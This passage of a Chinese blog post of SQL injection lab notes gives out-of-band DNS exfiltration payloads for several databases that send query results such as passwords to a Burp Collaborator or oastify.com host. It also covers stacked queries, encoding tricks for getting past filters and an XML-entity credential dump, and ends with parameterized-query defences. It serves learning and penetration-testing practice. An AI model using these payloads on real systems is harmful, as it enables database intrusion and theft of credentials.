class="line"><span class="string">     The lookup was received from IP address 34.245.205.119:14384 at 2026-abr.-29      07:27:29.265 UTC.</span></span><br></pre></td></tr></table></figure>
+
+<p>DNS 数据外泄：让数据库对包含注入查询结果的外部域名进行DNS查询，返回数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Oracle        <span class="keyword">SELECT</span> EXTRACTVALUE(xmltype(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> YOUR<span class="operator">-</span>QUERY<span class="operator">-</span>HERE)<span class="operator">||</span><span class="string">&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#x27;</span>),<span class="string">&#x27;/l&#x27;</span>) <span class="keyword">FROM</span> dual</span><br><span class="line">Microsoft     <span class="keyword">declare</span> <span class="variable">@p</span> <span class="type">varchar</span>(<span class="number">1024</span>);<span class="keyword">set</span> <span class="variable">@p</span><span class="operator">=</span>(<span class="keyword">SELECT</span> YOUR<span class="operator">-</span>QUERY<span class="operator">-</span>HERE);<span class="keyword">exec</span>(<span class="string">&#x27;master..xp_dirtree &quot;//&#x27;</span><span class="operator">+</span><span class="variable">@p</span><span class="operator">+</span><span class="string">&#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#x27;</span>)</span><br><span class="line">MySQL         <span class="keyword">SELECT</span> YOUR<span class="operator">-</span>QUERY<span class="operator">-</span>HERE <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#x27;</span></span><br><span class="line"></span><br><span class="line">PostgreSQL    权限控制和语法限制比较严格所以要用下面的方法来操作</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 创建或替换一个名为 f 的函数</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">OR</span> replace <span class="keyword">function</span> f() <span class="keyword">returns</span> void <span class="keyword">as</span> $$</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 声明变量：c 用于存最终命令，p 用于存查出来的密码</span></span><br><span class="line"><span class="keyword">declare</span> c text;</span><br><span class="line"><span class="keyword">declare</span> p text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  <span class="comment">-- 3. 执行你的查询（比如查密码），并把结果存入变量 p</span></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="keyword">into</span> p (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">-- 4. 拼接成 shell 命令：nslookup 密码.你的域名</span></span><br><span class="line">  c :<span class="operator">=</span> <span class="string">&#x27;copy (SELECT &#x27;&#x27;&#x27;&#x27;) to program &#x27;&#x27;nslookup &#x27;</span><span class="operator">||</span>p<span class="operator">||</span><span class="string">&#x27;.BURP-COLLABORATOR-SUBDOMAIN&#x27;&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">-- 5. 执行这个动态拼接出来的命令</span></span><br><span class="line">  <span class="keyword">execute</span> c;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 核心：指定编程语言为 plpgsql，并声明“以创建者权限运行”</span></span><br><span class="line">$$ <span class="keyword">language</span> plpgsql security definer;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 7. 最后：调用这个函数触发攻击</span></span><br><span class="line"><span class="keyword">SELECT</span> f();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle XXE漏洞的示范</span><br><span class="line"><span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.tli8joodl7lgy5e3b92m5hkey54wsngc.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//返回内容：v7kmkpg1rb348mvm8vqb.tli8joodl7lgy5e3b92m5hkey54wsngc.oastify.com.</span></span><br><span class="line"><span class="string">密码：v7kmkpg1rb348mvm8vqb</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>批量执行多个查询，但只返回第一个结果。一般通过第二次查询触发 DNS 查询、条件错误或时间延迟</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle       不支持</span><br><span class="line">Microsoft    QUERY<span class="number">-1</span><span class="operator">-</span>HERE; QUERY<span class="number">-2</span><span class="operator">-</span>HERE</span><br><span class="line">             QUERY<span class="number">-1</span><span class="operator">-</span>HERE QUERY<span class="number">-2</span><span class="operator">-</span>HERE</span><br><span class="line">PostgreSQL   QUERY<span class="number">-1</span><span class="operator">-</span>HERE; QUERY<span class="number">-2</span><span class="operator">-</span>HERE</span><br><span class="line">MySQL        QUERY<span class="number">-1</span><span class="operator">-</span>HERE; QUERY<span class="number">-2</span><span class="operator">-</span>HERE  <span class="operator">/</span><span class="operator">/</span>通常不支持</span><br></pre></td></tr></table></figure>
+
+<h2 id="存储型SQL-注入"><a href="#存储型SQL-注入" class="headerlink" title="存储型SQL 注入"></a>存储型SQL 注入</h2><p>普通的SQL注入主要发生在程序处理HTTP请求的输入，并以不安全的方式把输入整合到SQL查询中。而存储型就是先把用户输入存储起来，等待后面的某一次HTTP请求这个存储的数据，并以不安全的方式整合到SQL查询中。</p>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>客户端和服务器都使用多种不同的编码在系统间传递数据，当要使用数据时就会先解码</p>
+<ul>
+<li>服务器 - URL 解码</li>
+<li>客户端 - HTML解码</li>
+</ul>
+<p>常见的混淆，以下的编码都可以套娃，但是一般的题目不会这么恶心</p>
+<table>
+<thead>
+<tr>
+<th>编码名称</th>
+<th>例子 1 (admin)</th>
+<th>例子 2 (password)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>URL 编码</code></td>
+<td><code>admin</code></td>
+<td><code>password</code></td>
+</tr>
+<tr>
+<td><code>双重 URL 编码</code></td>
+<td><code>%2561%2564%256d%2569%256e</code></td>
+<td><code>%2570%2561%2573%2573%2577%256f%2572%2564</code></td>
+</tr>
+<tr>
+<td><code>UTF-8</code></td>
+<td><code>%c0%a1%c0%a4%c0%ad%c0%a9%c0%ae</code></td>
+<td><code>%c1%b0%c0%a1%c1%b3%c1%b3%c1%b7%c0%af%c1%b2%c0%a4</code></td>
+</tr>
+<tr>
+<td><code>Unicode 编码</code></td>
+<td><code>\u0061\u0064\u006d\u0069\u006e</code></td>
+<td><code>\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064</code></td>
+</tr>
+<tr>
+<td><code>HTML 实体编码</code></td>
+<td><code>&amp;#97;&amp;#100;&amp;#109;&amp;#105;&amp;#110;</code></td>
+<td><code>&amp;#112;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;</code></td>
+</tr>
+<tr>
+<td><code>XML 实体编码</code></td>
+<td><code>&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;</code></td>
+<td><code>&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x77;&amp;#x6f;&amp;#x72;&amp;#x64;</code></td>
+</tr>
+<tr>
+<td><code>Base64 编码</code></td>
+<td><code>YWRtaW4=</code></td>
+<td><code>cGFzc3dvcmQ=</code></td>
+</tr>
+<tr>
+<td><code>Hex (十六进制)</code></td>
+<td><code>0x61646d696e</code></td>
+<td><code>\x70\x61\x73\x73\x77\x6f\x72\x64</code></td>
+</tr>
+<tr>
+<td><code>Octal (八进制)</code></td>
+<td><code>\141\144\155\151\156</code></td>
+<td><code>\160\141\163\163\167\157\162\144</code></td>
+</tr>
+<tr>
+<td><code>CHAR() 函数</code></td>
+<td><code>CHAR(97,100,109,105,110)</code></td>
+<td><code>CHAR(112,97,115,115,119,111,114,100)</code></td>
+</tr>
+<tr>
+<td><code>前导零</code></td>
+<td><code>000admin</code></td>
+<td><code>0000password</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>这里推荐使用 cyberchef 或者 burpsuite 的hackvector插件</p>
+</blockquote>
+<p>以XML混淆作为例子</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">测试输入是否被评估</span><br><span class="line"><span class="operator">&lt;</span>storeId<span class="operator">&gt;</span><span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>storeId<span class="operator">&gt;</span>   <span class="operator">/</span><span class="operator">/</span> <span class="number">608</span> unit</span><br><span class="line"><span class="operator">&lt;</span>storeId<span class="operator">&gt;</span><span class="number">1</span><span class="operator">+</span><span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>storeId<span class="operator">&gt;</span> <span class="operator">/</span><span class="operator">/</span> <span class="number">675</span> unit</span><br><span class="line"></span><br><span class="line">查询返回列数</span><br><span class="line"><span class="operator">&lt;</span>storeId<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span><span class="operator">&lt;</span><span class="operator">/</span>storeId<span class="operator">&gt;</span>  <span class="operator">/</span><span class="operator">/</span>有waf 可以用hackvector来编码</span><br><span class="line"><span class="operator">&lt;</span><span class="variable">@dec_entities</span><span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">&#x27;hsjcha&#x27;</span><span class="operator">&lt;</span><span class="operator">/</span><span class="variable">@dec_entities</span><span class="operator">&gt;</span> <span class="operator">/</span><span class="operator">/</span> 只能返回一行</span><br><span class="line"></span><br><span class="line">查询账号密码</span><br><span class="line"><span class="operator">&lt;</span><span class="variable">@dec_entities</span><span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username <span class="operator">||</span> <span class="string">&#x27;~&#x27;</span> <span class="operator">||</span> password <span class="keyword">FROM</span> users<span class="operator">&lt;</span><span class="operator">/</span><span class="variable">@dec_entities</span><span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">返回：administrator<span class="operator">~</span>o3021lzh9tihabrhzoef</span><br></pre></td></tr></table></figure>
+
+<h2 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h2><p>参数化查询：在一般的查询中是把用户的输入直接拼接到SQL语句中，而参数化查询就是先写好一个框架，再把用户的输入用占号符 ‘?’ 来代替。这样做的好处就是把执行指令和输入数据彻底分开。可以用于：WHERE, INSERT, UPDATE 等等</p>
+<h3 id="易受SQL注入"><a href="#易受SQL注入" class="headerlink" title="易受SQL注入"></a>易受SQL注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span>+ input + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数化写法"><a href="#参数化写法" class="headerlink" title="参数化写法"></a>参数化写法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT * FROM products WHERE category = ?&quot;</span>);</span><br><span class="line">statement.setString(<span class="number">1</span>, input);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure>
+
+<p>这里的SQL注入会被当成一个文本名来查询，而不是当成指令来执行。</p>
+<p>这里为了保证参数化有效，绝对不能包含任何来源地变量数据</p>
+<p>但是在ORDER BY, 表或列名 不能使用参数化，因为SQL必须先知道你要查哪个表，才能预编译。所以还要加入白名单来配合使用，但就就算是这样也没有绝对安全可言。</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/04/01/qsnctf-web-writeup/"
+                                   title="青少年CTF S1.2026 Web Writeup"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">青少年CTF S1.2026 Web Writeup</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-text">基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93%E6%B3%A8%E9%87%8A%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-text">–注释的应用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%AD%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="nav-text">从数据库表中检索数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">检查数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-Microsoft"><span class="nav-text">MySQL &#x2F; Microsoft</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9"><span class="nav-text">列出数据库内容</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-Microsoft-1"><span class="nav-text">MySQL &#x2F; Microsoft</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-1"><span class="nav-text">Oracle</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E5%8D%95%E4%B8%80%E5%88%97%E4%B8%AD%E6%9F%A5%E8%AF%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-text">在单一列中查询多个值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E7%9B%B2%E6%B3%A8"><span class="nav-text">SQL 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%A6%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="nav-text">带条件响应的SQL盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-text">基于错误消息的SQL注入数据提取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OAST-%E5%A4%96%E5%B8%A6%E7%9B%B2%E6%B3%A8"><span class="nav-text">OAST 外带盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠查询注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BSQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">存储型SQL 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-text">绕过技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">防止SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%93%E5%8F%97SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">易受SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%8C%96%E5%86%99%E6%B3%95"><span class="nav-text">参数化写法</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">hsjcha</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">29.8k</span>
+                </span>
+            
+
+            
+
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-text">基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93%E6%B3%A8%E9%87%8A%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-text">–注释的应用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%AD%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="nav-text">从数据库表中检索数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">检查数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-Microsoft"><span class="nav-text">MySQL &#x2F; Microsoft</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9"><span class="nav-text">列出数据库内容</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-Microsoft-1"><span class="nav-text">MySQL &#x2F; Microsoft</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-1"><span class="nav-text">Oracle</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E5%8D%95%E4%B8%80%E5%88%97%E4%B8%AD%E6%9F%A5%E8%AF%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-text">在单一列中查询多个值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E7%9B%B2%E6%B3%A8"><span class="nav-text">SQL 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%A6%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="nav-text">带条件响应的SQL盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-text">基于错误消息的SQL注入数据提取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OAST-%E5%A4%96%E5%B8%A6%E7%9B%B2%E6%B3%A8"><span class="nav-text">OAST 外带盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠查询注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BSQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">存储型SQL 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-text">绕过技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">防止SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%93%E5%8F%97SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">易受SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%8C%96%E5%86%99%E6%B3%95"><span class="nav-text">参数化写法</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
